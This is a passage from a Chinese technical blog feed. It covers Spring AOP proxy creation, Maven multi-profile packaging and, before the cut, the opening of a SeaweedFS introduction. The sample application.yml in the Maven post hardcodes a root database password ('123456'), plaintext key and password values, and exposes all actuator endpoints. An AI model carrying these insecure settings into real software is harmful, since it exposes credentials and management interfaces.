default)</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the proxy object</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getProxy</span><span class="params">(<span class="meta">@Nullable</span> ClassLoader classLoader)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> createAopProxy().getProxy(classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中createAopProxy()来自其父类ProxyCreatorSupport，具体如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Subclasses should call this to get a new AOP proxy. They should &lt;b&gt;not&lt;/b&gt;</span></span><br><span class="line"><span class="comment">* create an AOP proxy with &#123;<span class="doctag">@code</span> this&#125; as an argument.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">synchronized</span> AopProxy <span class="title">createAopProxy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.active) &#123;</span><br><span class="line">        activate();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getAopProxyFactory().createAopProxy(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getAopProxyFactory()返回了AopProxyFactory的唯一实现DefaultAopProxyFactory，然后其调用createAopProxy方法，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> AopProxy <span class="title">createAopProxy</span><span class="params">(AdvisedSupport config)</span> <span class="keyword">throws</span> AopConfigException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (config.isOptimize() || config.isProxyTargetClass() || hasNoUserSuppliedProxyInterfaces(config)) &#123;</span><br><span class="line">        Class&lt;?&gt; targetClass = config.getTargetClass();</span><br><span class="line">        <span class="keyword">if</span> (targetClass == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AopConfigException(<span class="string">&quot;TargetSource cannot determine target class: &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;Either an interface or a target is required for proxy creation.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (targetClass.isInterface() || Proxy.isProxyClass(targetClass)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> JdkDynamicAopProxy(config);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ObjenesisCglibAopProxy(config);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JdkDynamicAopProxy(config);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，根据目标类的条件，选择创建其Jdk动态代理或者基于Cglib的代理。查看DefaultAopProxyFactory类的说明可以看到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Default AopProxyFactory implementation, creating either a CGLIB proxy or a JDK dynamic proxy.</span><br><span class="line">Creates a CGLIB proxy <span class="keyword">if</span> one the following is <span class="keyword">true</span> <span class="keyword">for</span> a given AdvisedSupport instance:</span><br><span class="line">the optimize flag is set</span><br><span class="line">the proxyTargetClass flag is set</span><br><span class="line">no proxy interfaces have been specified</span><br><span class="line">In general, specify proxyTargetClass to enforce a CGLIB proxy, or specify one or more interfaces to use a JDK dynamic proxy.</span><br></pre></td></tr></table></figure><p>默认的AopProxyFactory实现，创建CGLIB代理或JDK动态代理。</p><p>如果给定的AdvisedSupport实例满足以下条件之一，则创建CGLIB代理：</p><ul><li>设置了优化标志</li><li>设置了proxyTargetClass标志</li><li>没有指定代理接口</li></ul><p>通常，指定proxyTargetClass来强制执行CGLIB代理，或者指定一个或多个接口来使用JDK动态代理。</p><p>符合if条件逻辑。</p><h2 id="实现过程理清楚了，那么，spring是如何启用aop功能的呢？"><a href="#实现过程理清楚了，那么，spring是如何启用aop功能的呢？" class="headerlink" title="实现过程理清楚了，那么，spring是如何启用aop功能的呢？"></a>实现过程理清楚了，那么，spring是如何启用aop功能的呢？</h2><p>如果是使用springboot的情况下，可以看到spring-boot-autoconfiguer包有一个配置类:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnClass(&#123; EnableAspectJAutoProxy.class, Aspect.class, Advice.class,</span></span><br><span class="line"><span class="meta">AnnotatedElement.class &#125;)</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty(prefix = &quot;spring.aop&quot;, name = &quot;auto&quot;, havingValue = &quot;true&quot;, matchIfMissing = true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AopAutoConfiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableAspectJAutoProxy(proxyTargetClass = false)</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty(prefix = &quot;spring.aop&quot;, name = &quot;proxy-target-class&quot;, havingValue = &quot;false&quot;, matchIfMissing = false)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">JdkDynamicAutoProxyConfiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableAspectJAutoProxy(proxyTargetClass = true)</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty(prefix = &quot;spring.aop&quot;, name = &quot;proxy-target-class&quot;, havingValue = &quot;true&quot;, matchIfMissing = true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">CglibAutoProxyConfiguration</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，该配置类会读取配置文件中的spring.aop.auto属性，如果配置为true，或者没有配置，且路径下存在EnableAspectJAutoProxy.class, Aspect.class,</p><p>Advice.class，AnnotatedElement.class这些类的时候，该配置类则生效（matchIfMissing = true），然后再读取spring.aop.proxy-target-class的值来确定</p><p>使用Cglib还是Jdk动态代理。然后启用注解@<strong>EnableAspectJAutoProxy</strong>，该注解如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Import(AspectJAutoProxyRegistrar.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> EnableAspectJAutoProxy &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Indicate whether subclass-based (CGLIB) proxies are to be created as opposed</span></span><br><span class="line"><span class="comment"> * to standard Java interface-based proxies. The default is &#123;<span class="doctag">@code</span> false&#125;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">proxyTargetClass</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Indicate that the proxy should be exposed by the AOP framework as a &#123;<span class="doctag">@code</span> ThreadLocal&#125;</span></span><br><span class="line"><span class="comment"> * for retrieval via the &#123;<span class="doctag">@link</span> org.springframework.aop.framework.AopContext&#125; class.</span></span><br><span class="line"><span class="comment"> * Off by default, i.e. no guarantees that &#123;<span class="doctag">@code</span> AopContext&#125; access will work.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 4.3.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">exposeProxy</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到该注解导入了<strong>AspectJAutoProxyRegistrar</strong>类（@Import(AspectJAutoProxyRegistrar.class)），而AspectJAutoProxyRegistrar类最终将*<strong>AnnotationAwareAspectJAutoProxyCreator*</strong>类注入了</p><p>spring中，它是AspectJAwareAdvisorAutoProxyCreator的子类。所以最终回到前文所述的，完成对bean的代理实现。</p><h2 id="那么非springboot环境是如何启用的呢？"><a href="#那么非springboot环境是如何启用的呢？" class="headerlink" title="那么非springboot环境是如何启用的呢？"></a>那么非springboot环境是如何启用的呢？</h2><p>通常在spring xml配置文件加入<a href="aop:aspectj-autoproxy/">aop:aspectj-autoproxy/</a>标签启用，而这个标签对应的解析器为：AopNamespaceHandler，它是位于spring aop包下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AopNamespaceHandler</span> <span class="keyword">extends</span> <span class="title">NamespaceHandlerSupport</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Register the &#123;<span class="doctag">@link</span> BeanDefinitionParser BeanDefinitionParsers&#125; for the</span></span><br><span class="line"><span class="comment"> * &#x27;&#123;<span class="doctag">@code</span> config&#125;&#x27;, &#x27;&#123;<span class="doctag">@code</span> spring-configured&#125;&#x27;, &#x27;&#123;<span class="doctag">@code</span> aspectj-autoproxy&#125;&#x27;</span></span><br><span class="line"><span class="comment"> * and &#x27;&#123;<span class="doctag">@code</span> scoped-proxy&#125;&#x27; tags.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// In 2.0 XSD as well as in 2.1 XSD.</span></span><br><span class="line">registerBeanDefinitionParser(<span class="string">&quot;config&quot;</span>, <span class="keyword">new</span> ConfigBeanDefinitionParser());</span><br><span class="line">registerBeanDefinitionParser(<span class="string">&quot;aspectj-autoproxy&quot;</span>, <span class="keyword">new</span> AspectJAutoProxyBeanDefinitionParser());</span><br><span class="line">registerBeanDefinitionDecorator(<span class="string">&quot;scoped-proxy&quot;</span>, <span class="keyword">new</span> ScopedProxyBeanDefinitionDecorator());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only in 2.0 XSD: moved to context namespace as of 2.1</span></span><br><span class="line">registerBeanDefinitionParser(<span class="string">&quot;spring-configured&quot;</span>, <span class="keyword">new</span> SpringConfiguredBeanDefinitionParser());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该类注册了AspectJAutoProxyBeanDefinitionParser类，而AspectJAutoProxyBeanDefinitionParser类又注册了（具体代码就不贴了）AnnotationAwareAspectJAutoProxyCreator，达到了同样的效果。</p>]]></content>
      
      
      <categories>
          
          <category> spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>maven多配置</title>
      <link href="/maven%E5%A4%9A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/maven%E5%A4%9A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>开发的时候总会遇到不同环境需要的配置文件是不同的，maven提供的多配置文件打包所需要的plugin，配置一下即可搞定不同环境打包不同配置。</p> <a id="more"></a><p><strong>resources下面增加多配置的文件夹；如下：</strong></p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/17H9FFPRJAVAC347UDD600FV8I.png"></p><hr><p>apollo下的application.yml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app:</span><br><span class="line">  id: DataProcess</span><br><span class="line">apollo:</span><br><span class="line">  #apollo meta server地址</span><br><span class="line">  meta: http:&#x2F;&#x2F;192.168.6.205:8080&#x2F;</span><br><span class="line">  #apollo本地缓存路径  默认: windows C:\opt\data\  Linux: \opt\data\,  在Apollo服务不可用时,会从本地恢复配置</span><br><span class="line">  cacheDir: doc</span><br></pre></td></tr></table></figure><p>local下的appliction.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#端口号</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8688</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Content-FrontSwitch</span></span><br><span class="line">  <span class="comment">#数据库</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.alibaba.druid.pool.DruidDataSource</span></span><br><span class="line">    <span class="attr">druid:</span></span><br><span class="line">      <span class="attr">url:</span> <span class="string">jdbc:mysql://192.168.6.226:3306/Ti1CmdProcess?useUnicode=true&amp;characterEncoding=UTF-8&amp;useSSL=true</span></span><br><span class="line">      <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">      <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line">      <span class="comment">#连接池配置</span></span><br><span class="line">      <span class="attr">initialSize:</span> <span class="number">5</span></span><br><span class="line">      <span class="attr">max-active:</span> <span class="number">100</span></span><br><span class="line">      <span class="attr">min-idle:</span> <span class="number">5</span></span><br><span class="line">      <span class="attr">max-wait:</span> <span class="number">60000</span></span><br><span class="line">      <span class="attr">timeBetweenEvictionRunsMillis:</span> <span class="number">60000</span></span><br><span class="line">      <span class="attr">pool-prepared-statements:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">max-pool-prepared-statement-per-connection-size:</span> <span class="number">100</span></span><br><span class="line">      <span class="attr">minEvictableIdleTimeMillis:</span> <span class="number">300000</span></span><br><span class="line">      <span class="attr">validationQuery:</span> <span class="string">SELECT</span> <span class="number">1</span> <span class="string">FROM</span> <span class="string">DUAL</span></span><br><span class="line">      <span class="attr">testWhileIdle:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">testOnBorrow:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">testOnReturn:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:mapper/*.xml</span></span><br><span class="line"><span class="comment">#服务注册</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="number">192.168</span><span class="number">.6</span><span class="number">.205</span></span><br><span class="line">    <span class="attr">prefer-ip-address:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">lease-expiration-duration-in-seconds:</span> <span class="number">3</span></span><br><span class="line">    <span class="attr">lease-renewal-interval-in-seconds:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">registryFetchIntervalSeconds:</span> <span class="number">5</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://$&#123;eureka.instance.hostname&#125;:10010/eureka/</span></span><br><span class="line"></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">  <span class="attr">endpoint:</span></span><br><span class="line">    <span class="attr">health:</span></span><br><span class="line">      <span class="attr">show-details:</span> <span class="string">ALWAYS</span></span><br><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">root:</span> <span class="string">info</span></span><br><span class="line">    <span class="attr">com.jsc.content.frontswitch.mapper:</span> <span class="string">debug</span></span><br><span class="line"><span class="attr">socket:</span></span><br><span class="line">  <span class="attr">ti3:</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">8889</span></span><br><span class="line">    <span class="attr">filePath:</span> <span class="string">/u02/ycc/</span></span><br><span class="line">    <span class="attr">timeOut:</span> <span class="number">1000</span></span><br><span class="line">    <span class="comment">#白名单</span></span><br><span class="line">    <span class="attr">whitelist:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">192.168</span><span class="number">.16</span><span class="number">.201</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">192.168</span><span class="number">.16</span><span class="number">.134</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">192.168</span><span class="number">.99</span><span class="number">.166</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">192.168</span><span class="number">.6</span><span class="number">.17</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">192.168</span><span class="number">.6</span><span class="number">.99</span></span><br><span class="line">    <span class="attr">ki:</span> &#123;<span class="attr">ki1:</span> <span class="string">abcdefghijklmnop</span>,<span class="attr">ki2:</span> <span class="string">1234567890ABCDEF</span>,<span class="attr">ki3:</span> <span class="string">1234567890ABCDEF</span>&#125;</span><br><span class="line">    <span class="attr">kiPassword:</span> &#123;<span class="attr">ki1-password:</span> <span class="number">1234567890123456</span>,<span class="attr">ki2-password:</span> <span class="number">1234567890123456</span>,<span class="attr">ki3-password:</span> <span class="number">1234567890123456</span>&#125;</span><br><span class="line">    <span class="attr">kiKey:</span> <span class="number">0X27</span><span class="string">,0X3b,0X9e,0X52,0Xc0,0x4e,0xde,0x75,0x00,0xcb,0x4c,0x4d,0x57,0xfb,0x08,0x9e,0x27,0x3b,0x9e,0x52,0xc0,0x4e,0xde,0x75</span></span><br><span class="line">    <span class="attr">licId:</span> <span class="string">LIC0</span></span><br><span class="line">    <span class="attr">leaId:</span> <span class="string">IMS_YD_LEA</span></span><br><span class="line">    <span class="comment">#设备id</span></span><br><span class="line">    <span class="attr">equId:</span> <span class="number">630000</span><span class="number">-020601</span></span><br><span class="line">    <span class="comment">#更新数据库时间</span></span><br><span class="line">    <span class="attr">shedulTime:</span> <span class="number">30000</span></span><br><span class="line">    <span class="comment">#线程池大小</span></span><br><span class="line">    <span class="attr">maxNumPoolSize:</span> <span class="number">100</span></span><br><span class="line">    <span class="comment">#socket等待超时时间</span></span><br><span class="line">    <span class="attr">timer:</span> <span class="number">20000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">seaweedfs:</span></span><br><span class="line">  <span class="attr">host:</span> <span class="string">&#x27;192.168.6.226&#x27;</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9333</span></span><br></pre></td></tr></table></figure><hr><p>修改pom文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;build&gt;</span><br><span class="line">       &lt;resources&gt;</span><br><span class="line">           &lt;resource&gt;</span><br><span class="line">               &lt;directory&gt;src&#x2F;main&#x2F;resources&lt;&#x2F;directory&gt;</span><br><span class="line">               &lt;excludes&gt;</span><br><span class="line">                   &lt;exclude&gt;apollo&#x2F;*&lt;&#x2F;exclude&gt;</span><br><span class="line">                   &lt;exclude&gt;local&#x2F;*&lt;&#x2F;exclude&gt;</span><br><span class="line">               &lt;&#x2F;excludes&gt;</span><br><span class="line">           &lt;&#x2F;resource&gt;</span><br><span class="line">           &lt;resource&gt;</span><br><span class="line">               &lt;directory&gt;src&#x2F;main&#x2F;resources&#x2F;$&#123;profileActive&#125;&lt;&#x2F;directory&gt;</span><br><span class="line">           &lt;&#x2F;resource&gt;</span><br><span class="line">       &lt;&#x2F;resources&gt;</span><br><span class="line">       &lt;finalName&gt;Content-FrontSwitch&lt;&#x2F;finalName&gt;</span><br><span class="line">       &lt;plugins&gt;</span><br><span class="line">           &lt;plugin&gt;</span><br><span class="line">               &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;</span><br><span class="line">               &lt;artifactId&gt;spring-boot-maven-plugin&lt;&#x2F;artifactId&gt;</span><br><span class="line">               &lt;configuration&gt;</span><br><span class="line">                   &lt;includeSystemScope&gt;true&lt;&#x2F;includeSystemScope&gt;</span><br><span class="line">               &lt;&#x2F;configuration&gt;</span><br><span class="line">           &lt;&#x2F;plugin&gt;</span><br><span class="line">       &lt;&#x2F;plugins&gt;</span><br><span class="line">   &lt;&#x2F;build&gt;</span><br><span class="line"></span><br><span class="line">   &lt;!--profile --&gt;</span><br><span class="line">   &lt;profiles&gt;</span><br><span class="line">       &lt;profile&gt;</span><br><span class="line">           &lt;id&gt;apollo&lt;&#x2F;id&gt;</span><br><span class="line">           &lt;properties&gt;</span><br><span class="line">               &lt;profileActive&gt;apollo&lt;&#x2F;profileActive&gt;</span><br><span class="line">           &lt;&#x2F;properties&gt;</span><br><span class="line">       &lt;&#x2F;profile&gt;</span><br><span class="line">       &lt;profile&gt;</span><br><span class="line">           &lt;id&gt;local&lt;&#x2F;id&gt;</span><br><span class="line">           &lt;activation&gt;</span><br><span class="line">               &lt;activeByDefault&gt;true&lt;&#x2F;activeByDefault&gt;</span><br><span class="line">           &lt;&#x2F;activation&gt;</span><br><span class="line">           &lt;properties&gt;</span><br><span class="line">               &lt;profileActive&gt;local&lt;&#x2F;profileActive&gt;</span><br><span class="line">           &lt;&#x2F;properties&gt;</span><br><span class="line"></span><br><span class="line">       &lt;&#x2F;profile&gt;</span><br><span class="line"></span><br><span class="line">   &lt;&#x2F;profiles&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/13LRJJGJA6I8CCIPC97GJQ265I.png"></p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/38GIFCQ5RD2CLPBEFJAGEOQRN5.png"></p><p><strong>打包时选择需要的配置勾选并取消另外一个profile即可打包对应的配置文件，同样也可以增加mvn<br>package -P apollo,!local 来使用需要的配置文件(jenkins打不同环境的包)</strong></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> maven </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SeaweedFS</title>
      <link href="/SeaweedFS/"/>
      <url>/SeaweedFS/</url>
      
        <content type="html"><![CDATA[<p>seaweedfs是一个非常优秀的由 golang 开发的分布式存储开源项目。它是用来存储文件的系统，并且与使用的语言无关，使得文件储存在云端变得非常方便。</p><a id="more"></a><h2 id="SeaweedFS简介"><a href="#SeaweedFS简介" class="headerlink" title="SeaweedFS简介"></a>SeaweedFS简介</h2><p>SeaweedFS是基于go语言开发的高可用文件存储系统，主要特征</p><blockquote><ul><li>存储上亿的文件(最终受限制于硬盘大小)</li><li>速度快，内存占用小</li></ul></blockquote><br/><p>上手使用比fastDFS要简单很多，自带Rest API。</p><p>SeaWeeDFS作为对象存储库来有效地处理小文件。不是管理中央主机中的所有文件元数据，中央主机只管理文件卷，它允许这些卷服务器管理文件和它们的元数据。<br>这减轻了来自中央主机的并发压力，并将文件元数据扩展到卷服务器，允许更快的文件访问（仅一个磁盘读取操作）。</p><br/><p>每个文件的元数据只有40字节的磁盘存储开销。</p><br/><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>seaweedfs是一个非常优秀的由 golang 开发的分布式存储开源项目。它是用来存储文件的系统，并且与使用的语言无关，使得文件储存在云端变得非常方便。</p><p>在逻辑上Seaweedfs的几个概念：</p><blockquote><ul><li>master 存储映射关系，文件和fid的映射关系 weed master</li><li>Node 系统抽象的结点，抽象为datacenter、rack、datanode</li><li>datacenter 数据中心，包含多个rack，类似一个机房</li><li>rack ：属于一个datacenter，类似机房中的一个机架</li><li>datanode ： 存储节点，存储多个volume，类似机架中的一个机器 weed volume</li><li>volume ：逻辑卷，存储needle</li><li>needle： 逻辑卷中的object，对应存储的文件</li><li>collection：文件集，默认所有文件都属于””文件集。如果想给某些文件单独分类，可以在申请id的时候指定相同的文件集</li><li>filer ：指向一个或多个master的file服务器，多个使用逗号隔开。</li></ul></blockquote><p>weed 